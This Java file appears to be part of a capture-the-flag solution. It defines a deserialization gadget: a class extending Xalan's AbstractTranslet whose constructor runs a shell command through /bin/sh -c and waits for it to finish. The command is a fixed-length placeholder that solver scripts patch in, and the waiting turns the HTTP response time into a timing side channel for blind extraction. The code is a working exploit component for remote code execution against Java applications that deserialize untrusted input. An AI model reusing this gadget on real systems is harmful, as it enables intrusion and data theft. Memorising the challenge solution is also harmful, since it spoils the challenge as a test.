import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/**
 * Gadget stub: the constructor runs a shell command synchronously, so the HTTP
 * response time of the deserialization request equals the runtime of the
 * command - the property the timing side channel relies on (waitFor).
 *
 * The command is a fixed-length marker string that solution/solve.py and
 * solution/timing_solver.py patch in place.
 */
public class Translet extends AbstractTranslet {

    public Translet() {
        try {
            String cmd = "__CMD__STARTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA__CMD__END";
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            p.waitFor();
        } catch (Throwable t) {
            // swallowed: the caller turns any failure into HTTP 500 anyway
        }
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {
    }
}
